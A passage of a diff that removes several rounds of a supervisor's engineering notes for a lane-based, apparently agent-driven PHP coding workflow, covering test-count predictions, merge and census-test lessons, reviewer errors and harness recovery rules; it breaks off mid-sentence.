-18/18 closure by `is_link()` + `realpath()` prefix; `check-path-repos --no-lib-path-repos` rc 0; config md5
-`05480c743aff302fd6c06c5a4a4c2210`; zero tracked per-lib locks; **zero orphaned `php -S` servers**.
-Backlog **364 → 394**: E365–E367 landed on master mid-round, round-52 lane ids are **E368–E392**, and
-E393/E394 are this round's process findings. **Round 53 files from E395.**
-
-**Tests predicted EXACTLY for the TENTH consecutive round.** 🔴 **And the assertion LOWER BOUND landed
-EXACTLY on the bound for the first time — 143784 predicted, 143784 measured, looseness ZERO.**
-
-### 🔴 WHY THE ASSERTION BOUND WAS TIGHT, AND WHAT IT CONFIRMS ABOUT E191
-
-Every prior round the bound was loose, because additions that fall inside a census PREDICATE inflate it.
-This round predicted looseness and got none — **and the reason is the interesting part**. The two new
-`src/` files (`Support/Frontmatter.php`, `Support/EnumSpelling.php`) arrived on master in `a921b834`,
-which **already bumped `BuiltInToolCorpusTest` 292 → 294 in the same commit**. By the time the lanes
-merged, the census growth those files cause had already been absorbed, so nothing was left to inflate.
-
-**E191 sharpened: the bound is loose when a census-walked addition lands in the SAME merge as the census.
-When the addition and the census bump are already reconciled upstream, the bound is exact.** That makes
-the looseness predictable rather than a fudge factor — a tight bound is now evidence the reconciliation
-already happened, not evidence something was missed.
-
-### 🔴 MEASURE THE NEXT ROUND'S FLOOR AT THE COMMIT THE LANES BRANCH FROM (E167)
-
-…and have the lanes observe it themselves. **A lane touching a second library owes that library's figures
-separately** (rule 28) — this round lane a owed three, and its reviewer had to measure two more
-(`sugar-glow` 71/115, `sugar-prompt` 146/268/2, both green) because the brief's single floor was not
-enough to review against. **Write the brief with every package's floor in it.**
-
-### 🔴 MASTER MOVED MID-ROUND, AND ONE OF THOSE FIXES COLLIDED WITH A LANE — SEE E394
-
-Two out-of-band fixes landed on master while the lanes ran: `a921b834` (lenient frontmatter parser — six
-SKILL.md files were being silently dropped at every launch, plus `AgentPresetRegistry` silently mapping
-`acceptEdits` → `PermissionMode::Default`) and `e7c777b9` (E365, the `php -S` leak).
-
-**`e7c777b9` duplicated lane a's own work.** Lane a's brief was candy-core/candy-mosaic *fd defects*, and
-a descriptor inherited into a leaked child is exactly that — so both fixed the same leak in the same file.
-Master's version was kept whole; lane a's `+1 / +3` is therefore absent from the merged candy-mosaic
-figure, which is why that figure was **deliberately left unpredicted** rather than predicted additively.
-**Read the live lane briefs before dispatching any out-of-band fix.**
-
-### 🔴 LANE A's FIX STAGE "FAILED" AND HAD ALREADY DONE THE WORK — SEE E393
-
-`fix:a-core-fd` died on `403 Unable to verify organization membership` **after** applying every review
-finding and committing four times. Re-running the stage — one `resumeFromRunId` call away — would have
-handed a fresh agent an already-fixed tree and a findings list describing defects that no longer existed.
-**On ANY stage failure, `git log <base>..HEAD` in that lane BEFORE deciding what to re-run.** Third
-occurrence of "harness loses the report, work survives", third different proximate cause.
-
-### THE MERGE: PREDICT THE CONFLICTS BEFORE YOU START, AND DISTRUST THE CLEAN ONE
-
-The prediction file listed four expected conflicts before the first merge; three materialised. The fourth
-(`BuiltInToolCorpusTest` 292 vs 294) did not, for the reason above — master had already moved it and no
-lane touched it, so git took master's side cleanly.
-
-🔴 **The one that deserved suspicion was the one that merged cleanly.** `StderrEmitterCensusTest`
-auto-merged textually even though lane b had edited it out of lane (its BLOCKING-2, reported loudly rather
-than shipped silently). **A clean textual merge proves nothing for a census file whose assertions ARE
-counts** — `FIFTEEN`, `in FIVE files`, and a `NUMBER_WORDS` table that reds on a word it cannot parse. It
-was run rather than trusted: OK, 94 tests, 4935 assertions. Correct, but established rather than assumed.
-
-⚠️ **Renumber longest-id-first.** 25 provisional ids became E368–E392; a naive pass rewrites `Ec52-13`
-into `E3803` by matching `Ec52-1` inside it. Verify zero provisional ids remain **repo-wide**, not just in
-the backlog (rule 20).
-
-### WHAT THE LANES FOUND THAT OUTLIVES THIS ROUND
-
-- **Lane a's reviewer, MAJOR 1**: the new `TtyDetect` doc-block cited `RawMode` as evidence candy-pty is
-  still reached — when that very commit **severed** RawMode's only route to it. The lane's own backlog
-  entry said the opposite, in the same diff. Rule 8, third round running.
-- **Lane a's reviewer, MAJOR 2**: the census under-reported its own family 3-of-5 (the fix agent then
-  found a sixth). It missed `(int) $tty[0]` (array element) and `(int) STDIN` (bare constant) because
-  **the classifier's alphabet was written to match the cases already known** — rule 11 exactly. The missed
-  `size()` `/dev/tty` arm is the worst instance in the tree: a freshly opened handle's resource id can
-  never equal its own descriptor, so it is wrong on **every** run, not latent.
-- **Lane b's arithmetic** is the strongest reconciliation this project has produced: +25 declared test
-  methods against +35 executed, every one of the ten explained by RUNNING the class — 7 from a provider
-  over eight constructed sources, 2 from a provider yielding inside `foreach (DenialKind::cases())` so it
-  expands by the enum's cardinality rather than by diff text, 1 from a trait whose fixture executes per
-  consuming class and never appears as a `+` line. It also reported that the brief's suggested closer
-  (`grep -c '^+ *yield '` = 9) does **not** close the diff on its own. **Adopt this shape in every brief.**
-- **Lane b's BLOCKING-1**: a doc-block claimed "at most once per process" while the call was spelled
-  `noticeRefusalOnce(self::directoryRefusalReason($dir))` — **PHP builds arguments before the call**, so
-  the work ran every time and only the warning was latched. Fixed by making the parameter a `\Closure`, so
-  the type is the enforcement; a string parameter puts the inspection back in the caller.
-
----
-
-## SUPERSEDED — round 51 closed (floor 9730), kept for its reasoning; its FIGURES are superseded by §0-NOW-56, its RULES are not — read this first, then §0 for the standing rules
-
-**SUITE FLOOR: `9730 / 143168 / 1 skipped / rc 0` at `8629df24`** (merges `8bc556ed` a, `0cd0846e` b,
-`88dcc3ec` c). **`candy-mosaic` separately: `457 / 7744 / rc 0`** — round 51 is the first round a lane's
-work spanned two libraries, so **the merged floor is now TWO figures, not one.**
-Supersedes every earlier figure (9661 was round 51's base and round 50's close).
-**Skips MUST stay exactly 1** — `MCP\McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`.
-18/18 symlinks by `is_link()` + `realpath()` prefix; `check-path-repos --no-lib-path-repos` rc 0; config
-md5 `05480c743aff302fd6c06c5a4a4c2210`; zero tracked per-lib locks. Backlog **333 → 364**, round-51 ids
-**E334–E363** plus **E364**.
-
-**Tests predicted EXACTLY for the ninth consecutive round.** 🔴 **The assertion LOWER BOUND was violated
-for the first time — and by the supervisor, not the lanes. See E364 below.**
-
-🔴 **MEASURE THE NEXT ROUND'S FLOOR AT THE COMMIT THE LANES BRANCH FROM** (E167), and have the lanes
-observe it themselves. **A lane that touches a second library owes that library's figures separately.**
-
-### 🔴 E364 — THE ASSERTION BOUND ASSUMES A MONOTONIC MERGE
-
-Predicted at least `143171`; measured `143168`, three below. The merge-time resolution **deleted two
-roster rows**, and deleting data rows removes the assertions they generate. **The additive bound is a
-LOWER bound given no merge-time deletions.** Before reporting a violation, recompute the expectation from
-the lane deltas MINUS whatever the resolution removed. This was the guard working, not a defect.
-
-### 🔴 THE THIRD CROSS-LANE CATCH IN THREE ROUNDS — AND THE FIRST A LANE PREDICTED
-
-Lane c's `NonBlockingVocabularyTest` rostered two contradictory O_NONBLOCK sentences in a file **lane a
-owns**; lane a fixed them; the census red at the merge **and its failure message named the correct
-resolution** — delete the rows, "a data edit here, not a weaker check". Its `why` had already said the
-repair *"must land WITH this row's deletion or the census reds at the merge."*
-
-**Write guards this way.** A guard over files another lane owns should say, in its failure text, which of
-the two possible resolutions is right — because the person reading it at 3am is resolving a merge, not
-debugging a test.
-
-⚠️ **Deleting the rows emptied `UNREADABLE_ROSTER`.** An absence assertion with no positive input is the
-dead-instrument shape — **checked, not assumed**: disabling `negatesTheVerb()` reds the file with 14
-failures from fixtures independent of the rosters. Safe here. Where it is not, add a control fixture;
-never keep a stale row to keep a count non-zero.
-
-### TWO THINGS THAT WILL RECUR IF NOT WATCHED
-
-1. **A lane infers convention from the file it is appending to, not from the brief.** `COMMON` now
-   parameterises the round number and lanes a and b obeyed it — **lane c filed under `Ec49-` anyway**,
-   copying its neighbours. Harmless twice now only because prior rounds' ids had been renumbered away.
-   **The merge check is the control, not the instruction.**
-2. **Check which library a symbol lives in before assigning it.** Lane a's brief sent it to
-   `candy-palette/src/Probe/Detect.php`; `Detect` is in `candy-mosaic`. The lane found the right file and
-   flagged the discrepancy rather than following the wrong path.
-
----
-
-## SUPERSEDED — round 50's block, kept for its reasoning (its floor 9661 is superseded by §0-NOW-56; its rules are NOT) — read this first, then §0 for the standing rules
-
-**SUITE FLOOR: `9661 / 142165 / 1 skipped / rc 0` at `674cdf7b`** (merges `7973b4c9` a, `032a7c2f` b,
-`be9c0aa3` c; normalise + renumber `0b36f911`; E333 `674cdf7b`), 04:50.670, 304.64 MB. Supersedes every
-earlier figure (9582 was round 50's base, 9581 closed round 49, 9497 round 48).
-**Skips MUST stay exactly 1** — `MCP\McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`.
-18/18 symlinks by `is_link()` **plus a `realpath()` prefix check**; `check-path-repos --no-lib-path-repos`
-rc 0; config md5 `05480c743aff302fd6c06c5a4a4c2210`; zero tracked per-lib locks. Backlog **297 → 327**,
-round-50 ids **E304–E333**.
-
-**Tests predicted EXACTLY for the eighth consecutive round.** Assertions predicted as a lower bound of
-142141, landed 142165 — loose by 24 for the stated E191 reason. **ZERO cross-lane file overlap for the
-second round running.**
-
-🔴 **MEASURE THE NEXT ROUND'S FLOOR AT THE COMMIT THE LANES BRANCH FROM** (E167), and have the lanes
-observe it themselves.
-
-### ⚠️ THE FIRST FLOOR RUN WENT RED AND THE SECOND DID NOT — SEE E333 BEFORE TRUSTING ONE RED RUN
-
-`BootstrapSkillSkipsTest`'s two real-binary spawns each aborted at 60s in the first merged run; the
-immediate re-run at the same commit was clean. **Ruled out by measurement**: the file alone, the
-injected-Termios seam that writes O_NONBLOCK onto the runner's fd 0, lane b's prepend-residual test, and
-the supervisor's own probes (they ran during the CLEAN run). **E333 records the evidence and refuses to
-name a mechanism**, because round 49 blamed sibling-suite contention for the identical signature and this
-occurrence had no sibling suite. **Next time it reds: capture `/proc/<pid>/fd/0` of the hung child inside
-the 60s window.** One re-run is the bounded cost; do not chase it from one observation.
-
-### 🔴 THE ROUND'S BEST WORK WAS A LANE REFUTING ITS OWN REVIEWER, WITH NUMBERS
-
-Lane a was told to widen the denial frame's opener to `[A-Za-z]`. It measured instead: over 200,000 random
-strings, four seeds, the lookbehind changes the verdict **639–691 times with the capitalised opener and
-ZERO times widened** — a frame that may start with any letter always matches at a word start. **The
-prescription would have closed the gap and left a live-looking assertion doing nothing, manufacturing
-exactly the dormant code rule 6 exists about.** It fixed the real mechanism instead.
-**A reviewer's prescription is a hypothesis. Measure it before implementing it (rule 16).**
-
-Also: `filesNamingBoth()` returning `[]` left the WHOLE SUITE green — one caller, so a whole-suite
-survival.
-
-### WHAT LANE b DID NOT DO, WHICH MATTERS FOR ROUND 51
-
-**E296 IS STILL OPEN.** Lane b changed no `src/` file and no `tests/bootstrap.php`; its 2064 lines are
-three test files. It **measured option (a)'s viability** (three named readers), built the fd-0 reader
-roster, and found **E302's second defect is still open** — `Detect::stdinFd()` hands out an unguarded
-`?? STDIN`, so the `candy-mosaic` fix closed one of two. Round 51 can now implement the repair against a
-measured cost instead of a guess.
-
-### 🔴 TWO BRIEF DEFECTS TO FIX BEFORE ROUND 51 LAUNCHES
-
-1. **Parameterise the round number in `COMMON`.** Round 50's script reused round 49's verbatim, so all
-   three lanes filed under `E<lane>49-N`. Harmless only because round 49's ids had been renumbered away
-   before round 50 branched — verified zero at base. It will NOT be harmless the first time it is not.
-2. **The merge's heading count must match `^#{2,3} E`, not `^### E`.** Lane a filed six entries at `##`
-   (as round 48's lane c did), so the count read unchanged after its merge and the entries were nearly
-   missed.
-
----
-
-## SUPERSEDED — round 49's block, kept for its reasoning (its floor 9581 is superseded by §0-NOW-56; its rules are NOT) — read this first, then §0 for the standing rules
-
-**SUITE FLOOR: `9581 / 135471 / 1 skipped / rc 0` at `1a2caebb`** (merges `2cd49de9` a, `92aaa179` b,
-`3d3b9119` c, `ef46913e` d, `8964bfde` e; census bump `dfb01d2f`; renumber `90926b58`; drift fix
-`504d9a43`; candy-mosaic fix `1a2caebb`), `sugar-crush` LINKED (04:45.418, 300.12 MB). Supersedes every
-earlier figure (9499 was the round-49 base, 9497 held round 48, 9445 round 47, 9378 round 46).
-**Skips MUST stay exactly 1**, confirmed BY NAME:
-`MCP\McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`. A second skip means the
-closure is gone and every figure is void. 18/18 symlinks by `is_link()` **plus a `realpath()` prefix
-check**; `check-path-repos --no-lib-path-repos` rc 0; config md5 `05480c743aff302fd6c06c5a4a4c2210`; zero
-tracked per-lib locks. Backlog **239 → 297** entries, round-49 ids **E246–E303**.
-
-🔴 **MEASURE THE NEXT ROUND'S FLOOR AT THE COMMIT THE LANES BRANCH FROM** (E167), and have the lanes
-observe it themselves.
-
-### 🔴 THE HEADLINE: A GUARD FROM ONE LANE CAUGHT A DEFECT FROM ANOTHER
-
-The merge red on exactly ONE test. `Support\DuplicatedTestHelperDriftTest` — **lane d's** guard — found
-two copies of `withErrorLogDiscarded()` that **lane b** had written into two of its OWN files, bodies
-identical but for the `tempnam()` prefix. **Neither lane could see it**: both copies were lane b's, and
-the guard was lane d's. It reds on the merged tree and nowhere else.
-
-**This is the argument for the whole lane system, demonstrated rather than asserted** — build guards in
-one lane against code another lane writes, and the merge is where they earn their keep. Fixed by
-extraction to `tests/Support/DiscardsErrorLogTrait.php` (union doc-block), not by an accepted-divergence
-row.
-
-### PREDICTION HELD FOR THE SEVENTH ROUND, AND THE BOUND WAS LOOSE FOR THE STATED REASON
-
-Tests predicted additively and **exact**: 9499 + (15+18+9+12+28) = 9581. Assertions predicted as a lower
-bound of 135467, landed **135471** — loose by 4, for the reason named in advance (E191: lane c owns the
-`src/`-wide censuses, four siblings write into them). **Write the prediction to a file before the run
-finishes**; that is what makes it a prediction.
-
-### A LIVE FATAL IN A SIBLING LIB, AND WHY IT WAS INVISIBLE
-
-`candy-mosaic`'s `Mosaic::autoFromPalette()` named `PaletteCapability::Iterm2Image`; the enum spells it
-`ITerm2`. Enum cases resolve at USE time, so it parsed and loaded and threw for every terminal that missed
-the Kitty branch. **Nothing ever reached the line** until lane e closed descriptor 0 and made
-`Detect::probe()` throw. Fixed at `1a2caebb` with a SOURCE-SCAN guard, because the failure mode is a name
-and branch coverage cannot express "every case named anywhere in `src/`".
-
-### 🔴 THREE HARNESS RULES LEARNED THE HARD WAY THIS ROUND
-
-1. **Launch workflows from a DURABLE script path** (`.../workflows/scripts/`). A resume target under
-   `/tmp/.../scratchpad/` fails with **"adopt scriptPath rejected"** when the background fork tries to
-   take it over — that killed run 2 outright.
-2. **A resume's cache key is `(prompt, opts)`, so `COMMON` is untouchable while a run is resumable.** One
-   character there re-runs every lane, including the ones already cached and paid for.
-3. **FINISH, DO NOT RESTART.** When a run dies mid-review, inject each lane's real HEAD, commit list and
-   uncommitted files into the next brief. Restarting would have discarded 5–7 review commits per lane.
-   ⚠️ **Make the hazard prose CONDITIONAL on the injected state** — lane d was told to finish an
-   uncommitted edit it did not have and warned it was detached when it was not, and said so.
-
-### AND THE ONE THAT KEEPS RECURRING
-
-**Two lanes were caught holding LIVE MUTATION PROBES at the moment their agents died** (lane a a reverted
-`DenialKind` call, lane e a `false &&`) — E168 observed directly rather than inferred. **Lane d came back
-`HEAD detached at db90e768` with 0 commits, looking like a total loss; `master` still held all 16.**
-🔴 **Check `git branch` and `git reflog` before believing a lane lost anything**, and inspect a dirty tree
-before reverting it — in this round two dirty trees were probes and two were real work, and only reading
-the diffs told them apart.
-
-**A `cd` followed by a relative path destroyed a file twice this session** (once `NonInteractive.php`, once
-an over-greedy regex across two test files). Both were fully recoverable **only because the work was
-committed first.** Commit before measuring; commit before mutating.
-
----
-
-## SUPERSEDED — round 48's block, kept for its reasoning (its floor 9497 is superseded by §0-NOW-56; its rules are NOT)
-
-**SUITE FLOOR: `9497 / 133585 / 1 skipped / rc 0` at `2b57cd9c`** (merges `68189e5e` a, `198ce2f3` b,
-`3c1f8aa8` c; renumbering `2b57cd9c`), supervisor-measured twice in the live tree — once at the merge and
-again after the renumber, byte-identical both times — `sugar-crush` LINKED (04:32.542, 280.40 MB).
-Supersedes every earlier figure (9445 held round 47, 9378 round 46, 9308 round 45, 9215 round 44).
-⚠️ **The CURRENT master floor is `9499 / 133587` at `db90e768`** — the pre-round-49 `uniqid`
-fix added two tests (its guard). 9497 is round 48's close; 9499 is what round 49's lanes branch from.
-**Skips MUST stay exactly 1**, confirmed BY NAME this round:
-`MCP\McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`. A second skip means the
-closure is gone and every figure is void. 18/18 symlinks by `is_link()`; config md5
-`05480c743aff302fd6c06c5a4a4c2210`; `check-path-repos --no-lib-path-repos` rc 0; only the root
-`composer.lock` tracked; all three lane HEADs confirmed ancestors of master by `git merge-base`.
-
-🔴 **MEASURE THE NEXT ROUND'S FLOOR AT THE COMMIT THE LANES BRANCH FROM** (E167). **All three lanes
-observed the base floor independently this round** — each checked `5a3fe80b` out detached, verified 18
-symlinks there first, ran the suite, and reproduced `9445 / 132167 / 1 / rc 0` to the unit. That is the
-strongest form of this check yet and it should be the standing ask.
-
-### 🔴 A TEXTUAL AUTO-MERGE OF A CENSUS IS THE DANGEROUS CASE — AND AN EXACT CARDINALITY IS WHAT SAVES IT
-
-`tests/Cli/StderrEmitterCensusTest.php` was touched by **lane a** (a 944-line rewrite of the channel
-partition) **and lane c** (registering the new E219 stderr site). Git merged it **with no conflict at
-all** — the case where "green" is least informative, because nothing forced a human to look.
-
-**It composed correctly, and that was not luck.** Verified by mutation at merge: replacing lane c's
-`\fwrite(\STDERR, …)` in `src/Cli/NonInteractive.php` with a comment reds the census with **3 failures**,
-one of them `Failed asserting that 12 is identical to 11`. The site lane c added is genuinely counted by
-the rosters lane a rewrote.
-
-**The general rule: a census that asserts an EXACT per-file cardinality is self-verifying under merge.**
-If lane c's site had landed without its count bump, or the bump without the site, the assertion reds. A
-census that asserted `>=`, or a subset, or "contains", would have merged textually AND stayed green while
-being wrong. **When two lanes must share a census, make it count exactly.** Prefer that to splitting the
-file, which is what the ownership map would otherwise demand.
-
-### THE PREDICTION RULE HELD A SIXTH ROUND — AND E191's OVERSHOOT WAS FINALLY OBSERVED
-
-**Tests 9497, EXACT — sixth consecutive round** (9445 + 29 + 6 + 17). **Assertions predicted as a LOWER
-BOUND of 133583 and landed at 133585, two over** — the first time the bound has been genuinely loose, and
-the mechanism is exactly E191's: **lane c's new stderr site fell inside lane a's census PREDICATE, not
-merely its scan SCOPE**, so the merged census makes assertions neither lane made alone. Round 47's bound
-was tight because no lane's additions entered a sibling's predicate; round 48's is loose because one did.
-**The rule is now confirmed in both directions. Keep saying which kind of prediction you are making, and
-say WHICH sibling's predicate you expect to absorb WHAT.**
-
-### 🔴 THE SALVAGE CONVENTION EARNED ITSELF — AND "UNVERIFIED" WAS THE LOAD-BEARING WORD
-
-The first launch died at **5 of 9**. Lanes a and b were dirty with real work (inspected first, per §0's
-rule), committed as `SALVAGE (unverified)`. **Lane a's fix agent then found that salvage commit `9baf0394`
-CALLED `constructionSites()` and never DEFINED it** — the killed agent had committed a half-written
-helper. Commit `82520ba4` writes it.
-
-**Had the salvage been labelled as working, the fix agent would have had reason to trust it.** The label
-is not politeness; it is what routes the successor into checking. Keep the exact wording: supervisor as
-committer, and *nothing about this has been checked*.
-
-### 🔴 THE BRIEF WAS FALSIFIED BY A LANE, ON ITS OWN HEADLINE ITEM
-
-§0-NOW-48 (now superseded) called `WorktreeManager`'s four refusals **"the most valuable — a worktree that could not be
-created is an action the user asked for that did not happen."** Lane a measured it: **nothing in `src/` or
-`bin/` constructs a `WorktreeManager` at all.** All four sites are DORMANT. The lane routed them anyway,
-on the tree's own *DORMANT IS NOT UNGATED* doctrine — a dormant emitter's channel is the one its first
-caller inherits — and pinned the dormancy with a construction-site guard so the claim cannot rot.
-
-**The supervisor's brief is evidence like any other. A lane that measures it false and says so is doing
-the job.** Write briefs so that is cheap: state the reachability claim separately from the routing
-instruction, so a lane can falsify one without abandoning the other.
-
-### 🔴 FOUR MORE FAILED REVIEWER PRESCRIPTIONS — AND A REVIEWER THAT MISSED A DEFECT IN ITS OWN SUBJECT
-
-- **Lane a's B7** pointed at the wrong alphabet: it framed `fputs`/`fprintf` as a hole in the *alias*
-  list, but `fputs(STDERR, …)` needs no import, so the alias channel never sees it. The real misfiling was
-  a hard-coded `'fwrite'` in the channel split — **the review's own table showed this and its prescription
-  did not follow its own column.**
-- **Lane a's B1** restated a fixture contract that **cannot fail**: `token_get_all()` returns a comment as
-  ONE token, so no token-based scanner can ever find a `T_NEW` inside one. The mutation the fixture's own
-  message names SURVIVED.
-- **Lane c's MAJOR-2** prescribed a regex that reds the guard **on the day it lands**, on two entirely
-  correct strings in `src/Runtime.php`. Measured before implementing.
-- **Lane b's MAJOR 2/R1** was **benign, not a hole** — the five directories it wanted removed are 100%
-  clean, and a clean directory inside and outside SCOPE are observationally identical. The reviewer's own
-  NOTE 8 gave that exact reasoning for a structurally identical case and then graded this one MAJOR.
-
-🔴 **New, and the sharpest of the five: lane b's reviewer missed a LIVE defect in the code it was
-reviewing.** `ChildStderrCaptureScanner::classifySpec()` opened with a check requiring a literal `2 =>`
-key, so **every POSITIONAL `proc_open()` descriptor spec was answered `inherited` regardless of truth** —
-four different truths, one answer, wrong in both polarities. Two real sites were mis-shaped. **A reviewer
-grades the diff; it does not re-run the instrument.** Tell reviewers to execute the scanner they are
-reviewing against a known-answer control before grading anything it reports.
-
-### 🔴 A FIXTURE WHOSE EXPECTED VALUE IS WHAT A DEAD INSTRUMENT RETURNS PROVES NOTHING (rule 25)
-
-Filed as **E228**. "Assert 0 on a comments-only source" looks like a control and is not: `0` is also what
-the scanner returns when deleted entirely. This is rule 15 one level down — **the test's known-positive
-control was present and still did not save the fixture beside it**, because that fixture had its own
-independent hole. Sweep for fixtures expecting `0`, `[]` or `''` and ask, per fixture, what mutation of
-the instrument it would survive; where the answer is "all of them", give it a positive component.
-
-### THE BACKLOG IS NOW 239 ENTRIES — E221–E245 ARE NEW
-
-E221–E228 (lane a) · E229–E235 (lane b) · E236–E245 (lane c). Renumbered longest-id-first as always. Two
-merge-time notes: lane c filed its entries at `##` where the file uses `###` (normalised at merge — **tell
-lanes the heading level**), and **the blanket renumber corrupted the one sentence in this file that
-DISCUSSED the provisional id scheme**, turning `Ec48-10`/`-11` into `E245`. Harmless here because that
-sentence was being deleted, but the hazard is real: **exclude the "how to renumber" prose from the
-renumber.**
-
-**Start the next round with these:**
-- 🔴 **E226 — UNBLOCKED BY THIS MERGE, and lane a explicitly deferred it TO this moment.** Four stacked
-  doc-comment pairs remain in `src/` (`Commands/CommandSpec.php:816`, `Runtime.php:73`,
-  `Tools/BuiltIn/Glob.php:969`, `Tui/Components/MenuBar.php:368`), all UNEXAMINED. Lane a scoped its guard
-  to `Chat.php` **on purpose**, because widening it would have redded three sibling lanes in flight. That
-  reason is now gone. In `Chat.php`, **two of the three turned out to be the expensive kind** — a method
-  silently undocumented while its prose sat above an unrelated declaration. Examine all four, fix, then
-  widen the existing guard's file list to `src/` plus `bin/sugarcrush`; the scanner and both fixtures move
-  as-is.
-- 🔴 **E227 — the asymmetry this round created.** Round 48 routed six refusals onto the seam: four in
-  `WorktreeManager`, two in `SglangProvider`. It established `WorktreeManager`'s dormancy at length and
-  **asked nothing about `SglangProvider`.** Two of the six moves rest on an unstated assumption. The
-  scanner now exists and handles the `::new()` factory shape — run it over `src/` and `bin/`, **and over
-  the provider registry's dispatch**, since a provider is likelier reached by name-keyed table than by a
-  literal `new`.
-- **E228** — the can't-fail-fixture sweep, above.
-- **E194** — STILL DEFERRED, still a supervisor DECISION not an edit: no PHPUnit-level reset for
-  `RuntimeNoticeSink`, and a proper fix needs an `<extensions>` block in the supervisor-owned
-  `sugar-crush/phpunit.xml`. This round made it MORE pressing, not less — the seam now has six more
-  emitters on it.
-- **E229–E245** — lane b's seven and lane c's ten, including E242 (`tests/bootstrap.php`'s temp sandbox is
-  keyed by uid alone, **so two concurrent lanes share it** — that is a hazard to this very workflow) and
-  E241 (the background-session daemon gets no refusal notice).
-- **E124** — monorepo-root scope, still needs a supervisor decision before a lane can own it.
-
-Then the carried queue: **E154's remaining sites**, **E59's real-worker half**, **E61's L**, **E79**,
-**E77**, **E88** (`SelectPaneMsg` wiring), `keybindings` (L, DEFER — see E110), then **Phase 9**
-(interactive-prompt containment), then the deferred security pass.
-
-### ⚠️ CAVEATS THAT CARRY FORWARD
-
-**`php-cs-fixer` is genuinely absent on this box.** **PHP 8.4 was not exercised** — every token-lexing,
-width, regex and stdlib claim in rounds 45–48 is PHP 8.3.6 only. **Nothing inside a test can bound a child
-that outlives the whole PHPUnit process**; `tearDown()` closes the abort case only, and the rest needs the
-E194 `phpunit.xml` decision.
-
-🔴 **A supervisor mutation must assert its own address before writing.** At this merge, `sed -i
-"${L}s|.*|…|"` ran with `$L` EMPTY — the address vanished and the substitution hit **every line of
-`src/Cli/NonInteractive.php`**, destroying the file. Recovered completely by `git checkout --` only
-because the merge had been committed first. **Commit before mutating, and compute the target with a
-`assert len(hits)==1` guard rather than a shell variable that can be empty.**
-
----
-## SUPERSEDED — round 47's block, kept for its reasoning (its floor 9445 is superseded by §0-NOW-56; its rules are NOT)
-
-**SUITE FLOOR: `9445 / 132167 / 1 skipped / rc 0` at `fb2d13d8`** (merges `e8e35fa4`, renumbering
-`8a4421c9`, merge fix `fb2d13d8`), supervisor-measured in the live tree, `sugar-crush` LINKED
-(04:24.679, 278.40 MB). Supersedes every earlier figure (9378 held round 46, 9308 round 45, 9215 round 44).
-**Skips MUST stay exactly 1**, confirmed by name. 18/18 symlinks by `is_link()`; config md5
-`05480c743aff302fd6c06c5a4a4c2210`; `check-path-repos --no-lib-path-repos` rc 0; only the root
-`composer.lock` tracked.
-
-🔴 **MEASURE THE NEXT ROUND'S FLOOR AT THE COMMIT THE LANES BRANCH FROM** (E167). Round 47's brief did,
-and **lane c observed it directly and confirmed it to the unit** — the second round running a lane has
-closed that figure instead of inheriting it.
-
-### 🔴 E171 IS DONE. THE MID-SESSION SEAM EXISTS.
-
-A `RuntimeNoticeSink` with an explicit `arm()`, a `RuntimeNoticePumpMsg`, `Chat::subscriptions()` polling
-on `$this->inFlight || RuntimeNoticeSink::hasPending()`, and **both tool-call parsers routed onto it**
-(E170) — which had been blocked because both classes are `final readonly` with no accumulator to gate
-against. The delivery test crosses a real `pcntl_fork()` boundary, because E171's defect was never "the
-queue has no rows", it was **"the queue has rows and nothing reads them"**.
-
-**Next, and it is now cheap:** **E192** routes the remaining three mid-session emitters — `SglangProvider`
-(3), `AgentWorkerPool` (1), `WorktreeManager` (4). Each is a one-line change plus a routing decision under
-the rule both parsers' doc-blocks state (*a notice goes on the seam iff the emitter did not produce what
-the caller asked for*), plus a channel-6 roster bump and channel-3 decrement in `StderrEmitterCensusTest`.
-**`WorktreeManager`'s four are the most valuable — a worktree that could not be created is an action the
-user asked for that did not happen.** ⚠️ **E193 must land WITH E192, not before or after:** a notice raised
-while no turn is in flight waits for the next `Msg`. That never bites the two parsers (they run only
-inside a turn) but **will** bite `AgentWorkerPool` and `WorktreeManager`, which warn with the UI idle. The
-obvious fix — an unconditional tick — is the objection `subscriptions()`' own doc-block raises three times;
-the likely shape is a one-shot self-cancelling tick.
-
-### 🔴 A DIRTY LANE IS NOT AUTOMATICALLY A MUTATION. INSPECT BEFORE REVERTING.
-
-Round 47's first launch died with **0 of 9 agents done and all three implementers having committed before
-dying** (E190 on three lanes at once). Lanes a and b also had uncommitted work. **Round 45's answer was to
-revert; that does not make revert the answer.** Here it was real in-progress work — a 269-line delivery
-test and +101 lines on the lane's actual target — and reverting would have destroyed ~370 lines.
-
-**The distinguishing test:** a mutation is incoherent on its face and sits in a file the lane does not own;
-in-progress work is coherent and on-target. Commit it as `SALVAGE (unverified)`, saying plainly that the
-supervisor committed it and that nothing about it has been checked.
-
-**And if ZERO agents completed, there is no cache — RELAUNCH rather than resume, and improve the brief
-first.** Round 47 added a section telling each implementer its lane already holds a killed predecessor's
-commits: read them, find out whether the tree is green, mutate what they claim to pin, and **separate
-inherited from authored work in the report**, or the reviewer attributes all of it to the wrong agent.
-
-### THE MERGE WENT RED AND THAT WAS CORRECT — EXPECT THIS, DO NOT LOOSEN THE GUARD
-
-`ForkedChildReaperAdoptionTest` failed at merge because lane b widened the reaper's `SCOPE` while lane a
-added a file that forks inside PHPUnit. Neither lane could see the other; **the failure message was the
-instruction.** Resolved by ADOPTING (the trait, the reap as `tearDown()`'s first statement, two call sites,
-`Diagnostics/` in SCOPE) rather than exempting — both sites already reaped on the happy path, and the
-reaper covers the abort path where `pcntl_waitpid()` never runs, which is E142's mechanism.
-
-**Mutation-verified by the supervisor:** reverting ONE of the two sites is KILLED, the guard naming the
-file and counting "1 fork(s) not routed". `git diff --numstat` first (rule 13), scratchpad backup before
-the mutation (rule 19), restore verified by an empty `git status --porcelain`.
-
-### THE PREDICTION RULE IS NOW RELIABLE — BOTH FIGURES EXACT
-
-**Tests 9445, exact — fifth round running. Assertions 132167, predicted as "≥ and expected to land ON the
-bound", and it did.** E191 applied correctly one round after being got wrong: only lane a added new `src/`
-files, so per-file censuses saw nothing from siblings, and the per-paragraph census decomposes linearly
-across lanes that only EDIT. **Keep saying which kind of prediction you are making and why.**
-
-### 🔴 NINE WRONG REVIEWER PRESCRIPTIONS ACROSS FOUR ROUNDS — BUT ONE FINALLY HELD
-
-Lane a put on the record that its F1 prescription **held up** and killed the mutation. That is the first
